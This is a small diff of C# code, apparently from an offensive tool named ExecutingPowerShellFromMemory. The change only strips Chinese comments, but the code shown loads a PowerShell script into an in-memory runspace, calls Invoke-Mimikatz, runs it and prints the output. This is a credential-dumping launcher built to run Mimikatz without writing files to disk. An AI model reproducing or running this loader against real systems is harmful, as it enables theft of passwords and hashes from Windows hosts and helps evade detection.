@@ -34,16 +34,12 @@ namespace ExecutingPowerShellFromMemory
             pipeline.Commands.AddScript(scriptContents);
             pipeline.Commands.AddScript("Invoke-Mimikatz");
 
-            // 执行命令
+     
             var results = pipeline.Invoke();
-
-            // 显示结果
             foreach (var result in results)
             {
                 Console.WriteLine(result.ToString());
             }
-
-            // 关闭管道和runspace
             pipeline.Dispose();
             runspace.Dispose();
             Console.ReadLine();
